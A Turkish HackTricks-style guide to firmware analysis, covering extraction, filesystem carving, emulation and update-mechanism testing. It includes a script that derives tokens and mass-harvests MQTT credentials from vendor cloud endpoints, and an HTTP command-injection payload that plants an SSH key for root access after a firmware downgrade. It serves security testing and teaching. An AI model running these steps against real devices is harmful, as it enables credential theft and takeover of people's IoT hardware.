# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

Firmware, cihazların donanım bileşenleri ile kullanıcıların etkileştiği yazılım arasındaki iletişimi yönetip kolaylaştırarak doğru çalışmasını sağlayan hayati önemde bir yazılımdır. Kalıcı bellekte saklanır; böylece cihaz açıldığı andan itibaren gerekli talimatlara erişip işletim sisteminin başlatılmasını sağlar. Firmware'in incelenmesi ve gerekirse değiştirilmesi, güvenlik açıklarını tespit etmede kritik bir adımdır.

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç şu verilerin toplanmasını kapsar:

- CPU mimarisi ve çalıştığı operating system
- Bootloader ile ilgili ayrıntılar
- Donanım düzeni ve datasheet'ler
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve düzenleyici sertifikalar
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilmiş zafiyetler

Bu amaçla, açık kaynak istihbaratı (OSINT) araçları çok değerlidir; ayrıca mevcut açık kaynak yazılım bileşenlerinin elle ve otomatik inceleme süreçleriyle analiz edilmesi önemlidir. Bu amaçla [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için ücretsiz static analysis sunar.

## **Firmware'i Elde Etme**

Firmware elde etme çeşitli yollarla gerçekleştirilebilir; her birinin farklı zorluk seviyeleri vardır:

- **Doğrudan** kaynaktan (geliştiriciler, üreticiler)
- Verilen talimatlardan **derleyerek**
- Resmi destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorguları kullanarak
- **Cloud storage**'a doğrudan erişerek, ör. [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla
- Man-in-the-middle teknikleri ile **güncellemeleri** yakalayarak
- Cihazdan **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden **çıkararak**
- Cihaz iletişiminde güncelleme isteklerini **sniffing** yaparak tespit ederek
- Sert kodlanmış update endpoint'lerini belirleyip kullanarak
- Bootloader veya ağ üzerinden **dumping**
- Diğer her yol başarısız olduğunda, uygun donanım araçları kullanarak depolama çipini **söküp okuyarak**

## Firmware'i Analiz Etme

Artık **firmware**'e sahipsiniz, nasıl ele alacağınızı bilmek için ondan bilgi çıkarmanız gerekiyor. Bunun için kullanabileceğiniz farklı araçlar:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla çok bir şey bulamadıysanız, görüntünün **entropisini** `binwalk -E <bin>` ile kontrol edin; düşük entropi ise muhtemelen şifrelenmemiştir. Yüksek entropi ise büyük olasılıkla şifrelenmiş (veya bir şekilde sıkıştırılmış) demektir.

Ayrıca, bu araçları firmware içine gömülmüş **dosyaları çıkarmak** için kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Alma

Önceki bahsedilen araçlarla, örneğin `binwalk -ev <bin>`, **dosya sistemini çıkarmış** olmalısınız.\\
Binwalk genellikle bunu **dosya sistemi türüyle aynı isimde bir klasörün içine** çıkarır; bu genellikle aşağıdakilerden biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuel Dosya Sistemi Çıkartma

Bazen binwalk, dosya sisteminin imzasında magic byte'ını içermez. Bu gibi durumlarda, binwalk'ı kullanarak dosya sisteminin offset'ini bulun ve ikili dosyadan sıkıştırılmış dosya sistemini carve edin; ardından aşağıdaki adımlara göre türüne göre manuel olarak çıkarın.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Aşağıdaki **dd command** ile Squashfs filesystem'ini carve edin.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanıldığı gibi)

`$ unsquashfs dir.squashfs`

Dosyalar sonrasında "`squashfs-root`" dizininde olacaktır.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve potansiyel zafiyetlerini anlamak için ayrıntılı olarak incelenmesi gerekir. Bu süreç, firmware image'dan değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın (kısaca `<bin>` olarak anılacaktır) ilk incelemesi için bir dizi komut verilmiştir. Bu komutlar, dosya türlerini belirlemeye, strings çıkarmaya, ikili veriyi analiz etmeye ve partition ile filesystem ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
İmajın şifreleme durumunu değerlendirmek için **entropi** `binwalk -E <bin>` ile kontrol edilir. Düşük entropi şifreleme eksikliğini işaret ederken, yüksek entropi olası şifreleme veya sıkıştırmaya işaret eder.

Gömülü **dosyaları** çıkarmak için, dosya incelemesi için **file-data-carving-recovery-tools** dokümantasyonu ve **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkartma

`binwalk -ev <bin>` kullanarak genellikle dosya sistemi çıkarılabilir; genellikle dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) konulur. Ancak, **binwalk** eksik magic bytes nedeniyle dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bu, dosya sisteminin offset'ini bulmak için `binwalk` kullanmayı ve ardından dosya sistemini carve etmek için `dd` komutunu kullanmayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daha sonra, dosya sistemi türüne göre (ör. squashfs, cpio, jffs2, ubifs) içeriği elle çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlar. Güvensiz network daemons, hardcoded credentials, API endpoints, update server işlevleri, uncompiled code, startup scripts ve compiled binaries çevrimdışı analiz için dikkatle incelenir.

**Anahtar konumlar** ve **inceleme öğeleri** şunlardır:

- **etc/shadow** ve **etc/passwd** - kullanıcı kimlik bilgileri için
- SSL sertifikaları ve anahtarları **etc/ssl** içinde
- Potansiyel zafiyetler için yapılandırma ve script dosyaları
- Daha ileri analiz için embedded binaries
- Yaygın IoT device web server'ları ve binaries

Dosya sisteminde hassas bilgiler ve zafiyetleri ortaya çıkarmaya yardımcı birkaç araç:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker) - hassas bilgi araması için
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) - kapsamlı firmware analizi için
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba) - statik ve dinamik analiz için

### Compiled Binaries Üzerinde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem source code hem de compiled binaries zafiyetler açısından dikkatle incelenmelidir. Unix binaries için **checksec.sh** ve Windows binaries için **PESecurity** gibi araçlar, istismar edilebilecek korunmasız binaries'leri tespit etmeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud config ve MQTT kimlik bilgilerinin elde edilmesi

Birçok IoT hub'ı cihaz başına yapılandırmalarını şu görünüme sahip bir cloud endpoint'inden çeker:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Firmware analizinde <token>'ın, örneğin hardcoded bir secret kullanılarak device ID'den lokal olarak türetildiğini görebilirsiniz:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, birinin deviceId ve STATIC_KEY'i öğrenmesi halinde URL'i yeniden oluşturup cloud config'i çekmesine olanak tanır; bu genellikle düz metin MQTT kimlik bilgilerini ve konu öneklerini açığa çıkarır.

Pratik iş akışı:

1) UART boot log'larından deviceId'i çıkarın

- 3.3V UART adaptörünü (TX/RX/GND) bağlayın ve log'ları kaydedin:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Bulut yapılandırma URL desenini ve broker adresini yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarma

- İkili dosyaları Ghidra/radare2'e yükleyin ve yapılandırma yolunu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (e.g., MD5(deviceId||STATIC_KEY)).
- Token'i Bash içinde türetin ve digest'i büyük harfe çevirin:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT credentials'i elde etme

- URL'i oluşturun ve curl ile JSON çekin; jq ile ayrıştırıp secrets'i çıkarın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve zayıf topic ACL'lerini (varsa) suistimal edin

- Kurtarılan kimlik bilgilerini kullanarak maintenance topic'larına abone olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir cihaz ID'lerini listeleyin (ölçekli, yetkilendirme ile)

- Birçok ekosistem vendor OUI/product/type baytlarını, ardından gelen sıralı bir sonek ile gömer.
- Aday ID'leri yineleyebilir, tokens türetebilir ve configs'i programatik olarak çekebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration yapmadan önce her zaman açık izin alın.
- Mümkün olduğunda hedef donanımı değiştirmeden secrets'i geri kazanmak için emulation veya static analysis'i tercih edin.

emulating firmware süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis**'ını mümkün kılar. Bu yaklaşım donanım veya architecture bağımlılıklarıyla zorluklar yaşayabilir, ancak root filesystem'i veya belirli binaries'i eşleşen architecture ve endianness'e sahip bir cihaza, örneğin Raspberry Pi'ye, ya da önceden hazırlanmış bir virtual machine'e aktarmak, daha fazla test yapılmasını kolaylaştırabilir.

### Emulating Individual Binaries

Tek programları incelemek için programın endianness'ini ve CPU architecture'ını belirlemek çok önemlidir.

#### Example with MIPS Architecture

Bir MIPS architecture binary'sini emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian) için `qemu-mips` kullanılır; little-endian ikililer için `qemu-mipsel` tercih edilir.

#### ARM Mimarisi Emülasyonu

ARM ikilileri için süreç benzerdir; emülasyon için `qemu-arm` kullanılır.

### Tam Sistem Emülasyonu

Araçlar like [Firmadyne](https://github.com/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve benzerleri tam firmware emülasyonunu kolaylaştırır, süreci otomatikleştirir ve dinamik analize yardımcı olur.

## Pratikte Dinamik Analiz

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. İşletim sistemi (OS) ve dosya sistemine shell erişimini korumak esastır. Emülasyon donanım etkileşimlerini tam olarak taklit etmeyebilir; bu nedenle zaman zaman emülasyonun yeniden başlatılması gerekebilir. Analiz sırasında dosya sistemine geri dönülmeli, açığa çıkmış web sayfaları ve ağ servisleri sömürülmeli ve bootloader zafiyetleri araştırılmalıdır. Firmware bütünlük testleri, olası backdoor zayıflıklarını belirlemek için kritiktir.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi, bir süreç veya ikili ile onun çalışma ortamında etkileşim kurmayı içerir; breakpoint koymak ve fuzzing gibi tekniklerle zafiyetleri tespit etmek için gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.

## İkili Sömürüsü ve Proof-of-Concept

Belirlenen zafiyetler için bir PoC geliştirmek, hedef mimariyi derinlemesine anlamayı ve düşük seviyeli dillerde programlamayı gerektirir. Gömülü sistemlerde ikili çalışma zamanı korumaları nadirdir; ancak mevcutsa Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

## Firmware Analizi İçin Hazır İşletim Sistemleri

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, gerekli araçlarla önceden yapılandırılmış firmware güvenlik testi ortamları sağlar.

## Firmware'i Analiz Etmek İçin Hazır OS'ler

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının güvenlik değerlendirmesi ve penetration testing yapmanıza yardımcı olmak için tasarlanmış bir distro. Gerekli tüm araçların yüklü olduğu önceden yapılandırılmış bir ortam sağlayarak size çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 tabanlı, firmware güvenlik testi araçlarıyla önceden yüklenmiş gömülü güvenlik testi işletim sistemi.

## Firmware Downgrade Saldırıları & Güvensiz Güncelleme Mekanizmaları

Bir satıcı firmware imajları için kriptografik imza kontrolleri uygulasa bile, **sürüm geri alma (version rollback / downgrade) koruması sıklıkla atlanır**. Eğer boot veya recovery loader yalnızca gömülü bir açık anahtar ile imzayı doğruluyorsa fakat flashlenen imajın *sürümünü* (veya monotonik bir sayacı) karşılaştırmıyorsa, bir saldırgan meşru olarak geçerli bir imzaya sahip olan **daha eski ve zafiyetli bir firmware'i** yükleyebilir ve böylece yamalanmış zafiyetleri yeniden ortaya çıkarabilir.

Tipik saldırı iş akışı:

1. **Daha eski imzalı bir imaj edinin**
* Satıcının halka açık indirme portalı, CDN veya destek sitesinden alın.
* Eşlik eden mobil/masaüstü uygulamalarından çıkarın (ör. bir Android APK içinde `assets/firmware/`).
* VirusTotal, internet arşivleri, forumlar gibi üçüncü taraf depolarından temin edin.
2. **İmajı cihaza yükleyin veya cihazın erişebileceği şekilde sunun** herhangi bir açık güncelleme kanalı üzerinden:
* Web UI, mobile-app API, USB, TFTP, MQTT, vb.
* Birçok tüketici IoT cihazı, Base64 ile kodlanmış firmware bloblarını kabul eden, sunucu tarafında bunları decode eden ve recovery/upgrade işlemini tetikleyen *kimlik doğrulaması olmayan* HTTP(S) endpoint'leri açığa çıkarır.
3. Düşürmeden sonra, yeni sürümde yamalanmış bir zafiyeti sömürün (ör. sonradan eklenmiş bir komut enjeksiyonu filtresi).
4. İsteğe bağlı olarak, kalıcılık sağlandıktan sonra tespit edilmemek için en son imajı tekrar flash'layın veya güncellemeleri devre dışı bırakın.

### Örnek: Downgrade Sonrası Komut Enjeksiyonu
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Zayıf (düşürülmüş) firmware'de, `md5` parametresi temizlenmeden doğrudan bir shell komutuna ekleniyor; bu, rastgele komut enjeksiyonuna izin veriyor (burada – SSH key-based root access etkinleştirme). Daha sonraki firmware sürümleri temel bir karakter filtresi getirdi, ancak downgrade korumasının olmaması bu düzeltmeyi etkisiz kılıyor.

### Mobil Uygulamalardan Firmware Çıkarma

Birçok vendor, uygulamanın cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilmesi için companion mobil uygulamalarının içinde tam firmware görüntülerini paketler. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya hatta düz `unzip` gibi araçlarla fiziksel donanıma dokunmadan imzalı görüntüleri çekebilirsiniz.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Güncelleme Mantığını Değerlendirme Kontrol Listesi

* *update endpoint*'in taşınması/kimlik doğrulaması yeterince korunuyor mu (TLS + authentication)?
* Cihaz flashing'den önce **version numbers** veya bir **monotonic anti-rollback counter** karşılaştırıyor mu?
* İmaj secure boot chain içinde doğrulanıyor mu (ör. signatures ROM code tarafından kontrol ediliyor mu)?
* Userland code ek sanity check'ler yapıyor mu (ör. allowed partition map, model number)?
* *partial* veya *backup* update akışları aynı validation logic'i tekrar kullanıyor mu?

> 💡  Eğer yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback attacks'e açıktır.

## Pratik İçin Zafiyetli Firmware

Firmware'deki zafiyetleri keşfetme pratiği yapmak için aşağıdaki zafiyetli firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referanslar

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Eğitim ve Sertifika

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
